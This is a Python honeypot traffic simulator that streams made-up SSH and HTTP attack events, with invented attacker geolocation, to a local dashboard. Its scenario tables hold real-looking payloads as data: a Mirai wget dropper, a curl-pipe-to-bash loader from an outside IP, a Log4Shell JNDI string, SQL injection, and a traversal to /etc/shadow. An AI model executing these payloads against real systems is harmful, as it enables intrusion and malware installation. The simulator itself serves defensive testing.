import argparse
import asyncio
import json
import logging
import random
import sys
from typing import Any, Dict, List

logger = logging.getLogger("sentineltrap.simulator")
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)

# Realistic global threat origin profiles with precise coordinates
GLOBAL_THREAT_ACTORS: List[Dict[str, Any]] = [
    {
        "ip_prefix": "185.220.101",
        "country": "Germany",
        "iso": "DE",
        "city": "Frankfurt",
        "lat": 50.1109,
        "lon": 8.6821,
        "asn": "AS205100 F3 Netze e.V.",
        "ptr_domain": "tor-exit.calyxinstitute.org",
    },
    {
        "ip_prefix": "45.155.205",
        "country": "Russia",
        "iso": "RU",
        "city": "Moscow",
        "lat": 55.7558,
        "lon": 37.6173,
        "asn": "AS49505 Selectel Network",
        "ptr_domain": "scan-node.msk.selectel.ru",
    },
    {
        "ip_prefix": "118.25.6",
        "country": "China",
        "iso": "CN",
        "city": "Shanghai",
        "lat": 31.2304,
        "lon": 121.4737,
        "asn": "AS45090 Tencent Cloud Computing",
        "ptr_domain": "cvm.ap-shanghai.myqcloud.com",
    },
    {
        "ip_prefix": "103.253.145",
        "country": "Vietnam",
        "iso": "VN",
        "city": "Hanoi",
        "lat": 21.0285,
        "lon": 105.8542,
        "asn": "AS131429 Viettel Group",
        "ptr_domain": "dynamic-vdc.viettel.vn",
    },
    {
        "ip_prefix": "179.43.176",
        "country": "Switzerland",
        "iso": "CH",
        "city": "Zurich",
        "lat": 47.3769,
        "lon": 8.5417,
        "asn": "AS51395 Privatel Ltd",
        "ptr_domain": "dedicated.privatel.ch",
    },
    {
        "ip_prefix": "198.98.51",
        "country": "United States",
        "iso": "US",
        "city": "New York",
        "lat": 40.7128,
        "lon": -74.0060,
        "asn": "AS53667 FranTech Solutions",
        "ptr_domain": "vps.ny.buyvm.net",
    },
    {
        "ip_prefix": "159.89.196",
        "country": "Singapore",
        "iso": "SG",
        "city": "Singapore",
        "lat": 1.3521,
        "lon": 103.8198,
        "asn": "AS14061 DigitalOcean LLC",
        "ptr_domain": "sgp1.droplet.digitalocean.com",
    },
    {
        "ip_prefix": "177.54.144",
        "country": "Brazil",
        "iso": "BR",
        "city": "Sao Paulo",
        "lat": -23.5505,
        "lon": -46.6333,
        "asn": "AS262589 Maxihost Ltda",
        "ptr_domain": "edge.sp.maxihost.com.br",
    },
    {
        "ip_prefix": "91.219.236",
        "country": "Netherlands",
        "iso": "NL",
        "city": "Amsterdam",
        "lat": 52.3676,
        "lon": 4.9041,
        "asn": "AS43350 NForce Entertainment",
        "ptr_domain": "hosted-by.nforce.com",
    },
    {
        "ip_prefix": "211.234.118",
        "country": "South Korea",
        "iso": "KR",
        "city": "Seoul",
        "lat": 37.5665,
        "lon": 126.9780,
        "asn": "AS9318 SK Broadband Co",
        "ptr_domain": "broadband.sktelecom.com",
    },
    {
        "ip_prefix": "103.145.22",
        "country": "Indonesia",
        "iso": "ID",
        "city": "Jakarta",
        "lat": -6.2088,
        "lon": 106.8456,
        "asn": "AS138840 PT Cloud Hosting",
        "ptr_domain": "node-jkt.idcloudhost.com",
    },
    {
        "ip_prefix": "196.52.43",
        "country": "South Africa",
        "iso": "ZA",
        "city": "Johannesburg",
        "lat": -26.2041,
        "lon": 28.0473,
        "asn": "AS37100 SEACOM Limited",
        "ptr_domain": "transit.jnb.seacomnet.com",
    },
    {
        "ip_prefix": "138.197.148",
        "country": "Canada",
        "iso": "CA",
        "city": "Toronto",
        "lat": 43.6532,
        "lon": -79.3832,
        "asn": "AS14061 DigitalOcean LLC",
        "ptr_domain": "tor1.cloud.digitalocean.com",
    },
    {
        "ip_prefix": "163.44.165",
        "country": "Japan",
        "iso": "JP",
        "city": "Tokyo",
        "lat": 35.6762,
        "lon": 139.6503,
        "asn": "AS7506 GMO Internet Group",
        "ptr_domain": "vps.tokyo.conoha.jp",
    },
    {
        "ip_prefix": "5.188.206",
        "country": "Bulgaria",
        "iso": "BG",
        "city": "Sofia",
        "lat": 42.6977,
        "lon": 23.3219,
        "asn": "AS204957 Neterra Ltd",
        "ptr_domain": "cloud-gw.sofia.neterra.net",
    },
    {
        "ip_prefix": "41.65.112",
        "country": "Egypt",
        "iso": "EG",
        "city": "Cairo",
        "lat": 30.0444,
        "lon": 31.2357,
        "asn": "AS8452 TE Data Egypt",
        "ptr_domain": "adsl-pool.cairo.tedata.net.eg",
    },
]

SSH_ATTACK_SCENARIOS: List[Dict[str, str]] = [
    {
        "attack_method": "SSH Dictionary Brute-Force",
        "credentials": "root:toor2026!@#",
        "payload": "SSH-2.0-libssh2_1.10.0 | userauth_password [root]",
        "user_agent": "SSH-2.0-libssh2_1.10.0",
        "severity": "Medium",
    },
    {
        "attack_method": "SSH Credential Brute-Force",
        "credentials": "admin:P@ssw0rd123",
        "payload": "SSH-2.0-Go-SSH-Scanner | auth-keyboard-interactive",
        "user_agent": "SSH-2.0-Go",
        "severity": "Medium",
    },
    {
        "attack_method": "Botnet Dropper Execution",
        "credentials": "root:vizxv",
        "payload": "cd /tmp || cd /var/run; wget http://185.220.101.44/bins/mirai.x86; chmod 777 mirai.x86; ./mirai.x86",
        "user_agent": "SSH-2.0-PuTTY_Release_0.78",
        "severity": "Critical",
    },
    {
        "attack_method": "Remote Code Execution (RCE)",
        "credentials": "ubuntu:ubuntu",
        "payload": "sh -c 'curl -fsSL http://45.155.205.91/ldr.sh | bash -s -- --rig-id=sentinel'",
        "user_agent": "SSH-2.0-OpenSSH_7.4",
        "severity": "Critical",
    },
    {
        "attack_method": "SSH Banner & Cipher Recon",
        "credentials": "N/A (Pre-Auth Recon)",
        "payload": "SSH-2.0-Masscan/1.3.2 | kex_algo: curve25519-sha256",
        "user_agent": "SSH-2.0-Masscan",
        "severity": "Low",
    },
    {
        "attack_method": "SSH Dictionary Brute-Force",
        "credentials": "postgres:postgres123",
        "payload": "SSH-2.0-Paramiko_2.11.0 | auth_password [postgres]",
        "user_agent": "SSH-2.0-paramiko_2.11.0",
        "severity": "Medium",
    },
]

HTTP_ATTACK_SCENARIOS: List[Dict[str, str]] = [
    {
        "attack_method": "SQL Injection (SQLi)",
        "credentials": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.admin",
        "method": "GET",
        "path": "/api/v1/admin/users?id=1%27%20UNION%20SELECT%20username,password_hash%20FROM%20information_schema.tables--",
        "body": "",
        "user_agent": "sqlmap/1.7.11#stable (https://sqlmap.org)",
        "severity": "Critical",
    },
    {
        "attack_method": "Directory Traversal / LFI",
        "credentials": "Basic YWRtaW46YWRtaW4xMjM=",
        "method": "GET",
        "path": "/api/v2/system/logs/download?file=../../../../etc/shadow%00",
        "body": "",
        "user_agent": "Mozilla/5.0 (X11; Linux x86_64) Nikto/2.5.0",
        "severity": "Critical",
    },
    {
        "attack_method": "Authentication Bypass SQLi",
        "credentials": "admin' OR '1'='1'-- : ********",
        "method": "POST",
        "path": "/api/v1/auth/login",
        "body": "{\"username\":\"admin' OR 1=1--\",\"password\":\"x9#Lp!22$kZ\"}",
        "user_agent": "python-requests/2.31.0",
        "severity": "Critical",
    },
    {
        "attack_method": "Remote Code Execution (RCE)",
        "credentials": "X-Api-Key: ${jndi:ldap://179.43.176.20:1389/ExploitPayload}",
        "method": "POST",
        "path": "/api/v1/cluster/exec",
        "body": "{\"cmd\":\"/bin/sh -c 'cat /etc/passwd && uname -a'\"}",
        "user_agent": "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
        "severity": "Critical",
    },
    {
        "attack_method": "Sensitive Endpoint Recon",
        "credentials": "N/A (Unauthenticated)",
        "method": "GET",
        "path": "/.env.production",
        "body": "",
        "user_agent": "Go-http-client/1.1",
        "severity": "Medium",
    },
    {
        "attack_method": "Sensitive Endpoint Recon",
        "credentials": "N/A (Unauthenticated)",
        "method": "GET",
        "path": "/actuator/env",
        "body": "",
        "user_agent": "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)",
        "severity": "Medium",
    },
    {
        "attack_method": "API Token / Credential Stuffing",
        "credentials": "sysadmin:Summer2026!Corp",
        "method": "POST",
        "path": "/api/v1/session/token",
        "body": "{\"grant_type\":\"password\",\"username\":\"sysadmin\",\"password\":\"Summer2026!Corp\"}",
        "user_agent": "Hydra/9.4 (https://github.com/vanhauser-thc/thc-hydra)",
        "severity": "Medium",
    },
    {
        "attack_method": "Automated Service Reconnaissance",
        "credentials": "N/A",
        "method": "GET",
        "path": "/robots.txt",
        "body": "",
        "user_agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
        "severity": "Low",
    },
]


def _pick_actor() -> Dict[str, Any]:
    base = random.choice(GLOBAL_THREAT_ACTORS)
    last_octet = random.randint(2, 253)
    ip_addr = f"{base['ip_prefix']}.{last_octet}"
    # Add slight sub-degree coordinate jitter so dense cluster dots remain distinguishable
    lat_jitter = round(base["lat"] + random.uniform(-0.35, 0.35), 4)
    lon_jitter = round(base["lon"] + random.uniform(-0.35, 0.35), 4)
    return {
        "source_ip": ip_addr,
        "reverse_ptr": f"node-{last_octet}.{base['ptr_domain']}",
        "geo": {
            "country": base["country"],
            "iso": base["iso"],
            "city": base["city"],
            "lat": lat_jitter,
            "lon": lon_jitter,
            "asn": base["asn"],
        },
    }


async def send_simulated_ssh_attack(host: str = "127.0.0.1", port: int = 2222) -> bool:
    """Connect to the SSH honeypot socket on port 2222 and transmit an attack frame."""
    actor = _pick_actor()
    scenario = random.choice(SSH_ATTACK_SCENARIOS)

    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=2.5)
        _ = await asyncio.wait_for(reader.readline(), timeout=2.0)

        sim_frame = {
            "source_ip": actor["source_ip"],
            "reverse_ptr": actor["reverse_ptr"],
            "geo": actor["geo"],
            "credentials": scenario["credentials"],
            "payload": scenario["payload"],
            "user_agent": scenario["user_agent"],
            "attack_method": scenario["attack_method"],
            "severity": scenario["severity"],
        }
        writer.write(f"SIM_SSH|{json.dumps(sim_frame)}\r\n".encode("utf-8"))
        await writer.drain()
        writer.close()
        await writer.wait_closed()
        return True
    except Exception as exc:
        logger.debug("Simulated SSH probe skipped: %s", exc)
        return False


async def send_simulated_http_attack(host: str = "127.0.0.1", port: int = 8080) -> bool:
    """Connect to the HTTP Admin honeypot socket on port 8080 and transmit an exploit probe."""
    actor = _pick_actor()
    scenario = random.choice(HTTP_ATTACK_SCENARIOS)

    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=2.5)
        body_bytes = scenario["body"].encode("utf-8")

        headers = [
            f"{scenario['method']} {scenario['path']} HTTP/1.1",
            f"Host: {host}:{port}",
            f"User-Agent: {scenario['user_agent']}",
            f"X-Forwarded-For: {actor['source_ip']}",
            f"X-Sentinel-Ptr: {actor['reverse_ptr']}",
            f"X-Sentinel-Geo: {json.dumps(actor['geo'])}",
            f"X-Sentinel-Creds: {scenario['credentials']}",
            f"X-Sentinel-Method: {scenario['attack_method']}",
            f"X-Sentinel-Severity: {scenario['severity']}",
            "Content-Type: application/json",
            f"Content-Length: {len(body_bytes)}",
            "Connection: close",
            "",
            "",
        ]
        request_payload = "\r\n".join(headers).encode("utf-8") + body_bytes
        writer.write(request_payload)
        await writer.drain()
        _ = await asyncio.wait_for(reader.read(512), timeout=2.0)
        writer.close()
        await writer.wait_closed()
        return True
    except Exception as exc:
        logger.debug("Simulated HTTP probe skipped: %s", exc)
        return False


async def run_continuous_simulation(
    host: str = "127.0.0.1",
    ssh_port: int = 2222,
    http_port: int = 8080,
    initial_burst: int = 14,
    min_interval: float = 2.2,
    max_interval: float = 5.0,
) -> None:
    """
    Seed an initial burst of multi-vector incidents so the map and forensic table
    populate immediately, then stream continuous telemetry probes.
    """
    logger.info("Waiting briefly for Honeypot TCP ports (%d, %d) to accept connections...", ssh_port, http_port)
    await asyncio.sleep(1.2)

    logger.info("Executing initial telemetry seed burst (%d events)...", initial_burst)
    for i in range(initial_burst):
        if i % 2 == 0:
            await send_simulated_http_attack(host, http_port)
        else:
            await send_simulated_ssh_attack(host, ssh_port)
        await asyncio.sleep(0.08)

    logger.info("Initial burst complete. Transitioning to real-time continuous simulation stream.")
    while True:
        if random.random() < 0.58:
            await send_simulated_http_attack(host, http_port)
        else:
            await send_simulated_ssh_attack(host, ssh_port)
        await asyncio.sleep(random.uniform(min_interval, max_interval))


def main() -> None:
    parser = argparse.ArgumentParser(
        description="SentinelTrap Local Adversarial Traffic & Telemetry Simulator"
    )
    parser.add_argument("--host", default="127.0.0.1", help="Target honeypot host address")
    parser.add_argument("--ssh-port", type=int, default=2222, help="Target SSH honeypot port")
    parser.add_argument("--http-port", type=int, default=8080, help="Target HTTP REST honeypot port")
    parser.add_argument("--burst", type=int, default=14, help="Initial seed burst count")
    parser.add_argument("--min-delay", type=float, default=2.2, help="Minimum delay between probes (s)")
    parser.add_argument("--max-delay", type=float, default=5.0, help="Maximum delay between probes (s)")
    args = parser.parse_args()

    try:
        asyncio.run(
            run_continuous_simulation(
                host=args.host,
                ssh_port=args.ssh_port,
                http_port=args.http_port,
                initial_burst=args.burst,
                min_interval=args.min_delay,
                max_interval=args.max_delay,
            )
        )
    except KeyboardInterrupt:
        logger.info("Attack simulator terminated by user.")
        sys.exit(0)


if __name__ == "__main__":
    main()
